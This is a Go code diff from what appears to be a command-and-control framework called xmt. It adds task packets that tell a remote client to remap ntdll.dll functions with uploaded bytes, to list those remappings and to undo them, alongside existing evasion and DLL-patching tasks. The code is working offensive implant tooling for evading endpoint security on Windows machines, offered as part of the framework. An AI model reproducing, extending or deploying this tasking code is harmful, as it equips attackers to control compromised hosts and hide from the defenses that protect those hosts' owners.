@@ -18,7 +18,32 @@
 
 package task
 
-import "github.com/iDigitalFlame/xmt/com"
+import (
+	"github.com/iDigitalFlame/xmt/com"
+	"github.com/iDigitalFlame/xmt/device/winapi"
+)
+
+// FuncUnmapAll returns a syscall function unmap Packet. This can be used to instruct
+// the client to unmap all of the re-mapped ntdll.dll functions to their original
+// addresses.
+//
+// This function only returns an error if it occurred during unmapping.
+//
+// Always returns 'ErrNoWindows' on non-Windows devices. Clients must have the
+// "funcmap" capability or they will return nil.
+//
+// C2 Details:
+//  ID: TvFuncMap
+//
+//  Input:
+//      uint8 // Always 2 for this
+//  Output:
+//      <none>
+func FuncUnmapAll() *com.Packet {
+	n := &com.Packet{ID: TvFuncMap}
+	n.WriteUint8(taskFuncMapUnmapAll)
+	return n
+}
 
 // Evade returns a client Evasion Packet. This can be used to instruct the client
 // perform evasion functions dependent on the supplied bitmask value.
@@ -40,6 +65,54 @@ import "github.com/iDigitalFlame/xmt/com"
 func Evade(f uint8) *com.Packet {
 	n := &com.Packet{ID: TvEvade}
 	n.WriteUint8(f)
+	return n
+}
+
+// FuncRemapList returns a syscall function mapping list Packet. This can be used to
+// instruct the client to return details of all of the re-mapped ntdll.dll functions.
+//
+// The result will be an array of FuncEntries that will indicate the new and original
+// memory addresses of the function the represent.
+//
+// Always returns 'ErrNoWindows' on non-Windows devices. Clients must have the
+// "funcmap" capability or they will return nil.
+//
+// C2 Details:
+//  ID: TvFuncMapList
+//
+//  Input:
+//      <none>
+//  Output:
+//      uint32        // Count
+//      []FuncEntry { // List of open Windows
+//          uint32    // Function hash
+//          uint64    // Function original address
+//          uint64    // Function swapped address
+//      }
+func FuncRemapList() *com.Packet {
+	return &com.Packet{ID: TvFuncMapList}
+}
+
+// FuncUnmap returns a syscall function unmap Packet. This can be used to instruct
+// the client to unmap the re-mapped ntdll.dll function name to it's original address.
+//
+// This function only returns an error if it occurred during unmapping.
+//
+// Always returns 'ErrNoWindows' on non-Windows devices. Clients must have the
+// "funcmap" capability or they will return nil.
+//
+// C2 Details:
+//  ID: TvFuncMap
+//
+//  Input:
+//      uint8  // Always 1 for this
+//      uint32 // FNV Hash of the function name
+//  Output:
+//      <none>
+func FuncUnmap(name string) *com.Packet {
+	n := &com.Packet{ID: TvFuncMap}
+	n.WriteUint8(taskFuncMapUnmap)
+	n.WriteUint32(winapi.FnvHash(name))
 	return n
 }
 
@@ -102,6 +175,32 @@ func PatchDLLFile(dll string) *com.Packet {
 	n.WriteString(dll)
 	n.WriteUint32(0)
 	n.WriteUint16(0)
+	return n
+}
+
+// FuncRemap returns a syscall function mapping Packet. This can be used to instruct
+// the client to upload the bytes to be re-mapped to a new memory address that
+// can be used to override the supplied ntdll.dll function name.
+//
+// This function only returns an error if it occurred during mapping.
+//
+// Always returns 'ErrNoWindows' on non-Windows devices. Clients must have the
+// "funcmap" capability or they will return EINVAL.
+//
+// C2 Details:
+//  ID: TvFuncMap
+//
+//  Input:
+//      uint8  // Always 0 for this
+//      uint32 // FNV Hash of the function name
+//      []byte // Function bytes to write into memory
+//  Output:
+//      <none>
+func FuncRemap(name string, b []byte) *com.Packet {
+	n := &com.Packet{ID: TvFuncMap}
+	n.WriteUint8(taskFuncMapMap)
+	n.WriteUint32(winapi.FnvHash(name))
+	n.WriteBytes(b)
 	return n
 }
 
